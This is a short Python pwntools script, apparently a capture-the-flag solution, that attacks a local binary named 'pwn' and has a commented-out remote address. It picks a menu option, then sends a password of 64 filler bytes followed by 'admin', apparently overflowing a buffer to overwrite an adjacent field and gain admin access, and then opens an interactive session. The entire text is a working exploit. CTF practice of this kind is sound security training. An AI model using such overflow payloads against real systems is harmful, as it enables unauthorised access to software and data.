from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('pwn')
r= e.process()
# r = remote('139.180.137.100', 1337)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

r.sendline(b"2")
payload=b"a"*64+b"admin"

r.sendlineafter(b"username:\n",b"a")
pause()
r.sendlineafter(b"passwd:\n",payload)

r.interactive()
